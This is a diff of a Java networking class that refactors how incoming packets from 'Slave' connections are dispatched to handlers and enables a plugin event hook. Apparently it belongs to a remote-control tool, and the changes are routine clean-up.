@@ -4,6 +4,7 @@ import java.util.HashMap;
 import java.util.Set;
 
 import com.redpois0n.Slave;
+import com.redpois0n.plugins.PluginEventHandler;
 
 public class Packets {
 
@@ -134,35 +135,27 @@ public class Packets {
 																						// desktop
 	}
 
-	public static boolean execute(byte line, Slave slave) {
+	public static boolean execute(byte header, Slave slave) {
 		try {
 			AbstractIncomingPacket ac = null;
 			Set<Byte> set = incomingPackets.keySet();
 			for (Byte str : set) {
-				if (str == line) {
+				if (str == header) {
 					ac = incomingPackets.get(str).newInstance();
 					break;
 				}
 			}
 			if (ac != null) {
-				/*if (line.equals("REGSTART")) {
-					new PacketREGSTART().read(slave, line);
-				} else if (line.equals("SO")) {
-					PacketSO.handle(slave);
-				} else {*/
-					ac.read(slave, slave.getDataInputStream());
-				//}
+				ac.read(slave, slave.getDataInputStream());
 			} else {
-				System.out.println("ac is null: " + line);
+				throw new NullPointerException("Could not find packet: " + header);
 			}
 
-			// TODO PluginEventHandler.onPacket(slave, line); 
-			String s;
+			PluginEventHandler.onPacket(slave, header); 
 
 			return ac != null;
 		} catch (Exception ex) {
-			Exception ex1 = new Exception("Failed to handle packet: " + line, ex);
-			ex1.printStackTrace();
+			ex.printStackTrace();
 			return false;
 		}
 	}
